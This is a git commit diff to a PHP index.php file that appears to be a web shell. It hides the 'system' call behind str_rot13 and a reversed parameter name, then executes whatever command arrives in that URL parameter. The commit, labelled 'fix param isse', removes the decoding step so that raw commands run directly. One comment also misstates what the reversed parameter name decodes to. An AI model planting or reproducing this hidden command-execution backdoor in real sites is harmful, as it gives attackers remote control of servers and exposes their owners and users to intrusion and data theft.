ce62622be9b8dc65d7a8ad94875214ca1fe3a567
1uffyD9 <49385501+1uffyD9@users.noreply.github.com>
2024-10-01 06:43:46 +0000

    fix param isse

--- index.php
+++ index.php
@@ -2,5 +2,5 @@
 $cmd = strrev("rehyfful"); // 'luffyhere' reversed
 $input = $_GET[$cmd]; // Get the input from the 'luffyhere' parameter
 $execute = str_rot13('flfgrz'); // Obfuscated 'system'
-$execute(str_rot13($input)); // Execute the command using the obfuscated 'system' function
+$execute($input); // Execute the command using the obfuscated 'system' function
 ?>
